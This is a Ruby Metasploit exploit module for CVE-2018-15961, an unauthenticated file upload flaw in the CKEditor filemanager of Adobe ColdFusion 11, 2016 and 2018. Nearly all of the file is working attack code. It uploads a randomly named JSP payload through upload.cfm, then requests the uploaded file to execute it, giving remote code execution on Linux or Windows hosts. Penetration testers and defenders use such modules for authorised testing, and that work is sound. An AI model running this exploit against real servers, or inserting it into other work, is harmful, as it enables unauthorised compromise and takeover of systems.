##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Adobe ColdFusion CKEditor unrestricted file upload',
      'Description'     => %q{
        A file upload vulnerability in the CKEditor of Adobe ColdFusion 11
        (Update 14 and earlier), ColdFusion 2016 (Update 6 and earlier), and
        ColdFusion 2018 (July 12 release) allows unauthenticated remote
        attackers to upload and execute JSP files through the filemanager
        plugin.
        Tested on Adobe ColdFusion 2018.
      },
      'Author'          =>
        [
          'Pete Freitag de Foundeo', # Vulnerability discovery
          'Vahagn vah_13 Vardanian', # First public PoC
          'Qazeer' # Metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ "CVE", "2018-15961" ],
          [ "BID", "105314" ],
          [ "URL", "https://helpx.adobe.com/fr/security/products/coldfusion/apsb18-33.html" ]
        ],
      'Privileged'      => false,
      'Stance'          => Msf::Exploit::Stance::Aggressive,
      'Platform'        => ['win', 'linux'],
      'Targets'        =>
        [
          [ 'Universal Linux Target',
            {
              'Arch'     => ARCH_JAVA,
              'Platform' => 'linux',
              'Payload'  =>
                {
                  'DisableNops' => true,
                },
            }
          ],
          [ 'Universal Windows Target',
            {
              'Arch'     => ARCH_JAVA,
              'Platform' => 'win',
              'Payload'  =>
                {
                  'DisableNops' => true,
                },
            }
          ],
        ],
      'DefaultTarget'   => 0,
      'DisclosureDate'  => 'Sep 11 2018'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ false, 'The CKEditor path', '/cf_scripts/scripts/ajax/ckeditor' ]),
      ])
  end

  def exploit
    filename = rand_text_alpha_upper(1..10) + '.jsp'

    print_status("Uploading the JSP payload at #{datastore['TARGETURI']}/plugins/filemanager/uploadedFiles/#{filename}...")

    mime = Rex::MIME::Message.new
    mime.add_part(payload.encoded, "application/octet-stream", nil, "form-data; name=\"file\"; filename=\"#{filename}\"")
    mime.add_part("path", "text/plain", nil, "form-data; name=\"path\"")

    post_str = mime.to_s
    post_str.strip!

    res = send_request_cgi(
      {
        'uri'		=> normalize_uri(datastore['TARGETURI'], "plugins", "filemanager", "upload.cfm"),
        'version'	=> '1.1',
        'method'	=> 'POST',
        'ctype'		=> 'multipart/form-data; boundary=' + mime.bound,
        'data'		=> post_str,
      })

    unless (res && res.code == 200)
      fail_with Failure::Unknown, 'Upload Failed...'
    end

    print_good("Upload succeeded! Executing payload...")

    send_request_cgi(
      {
        'uri'    => "#{datastore['TARGETURI']}/plugins/filemanager/uploadedFiles/#{filename}",
        'method' => 'GET'
      }, 5)
 
  end
end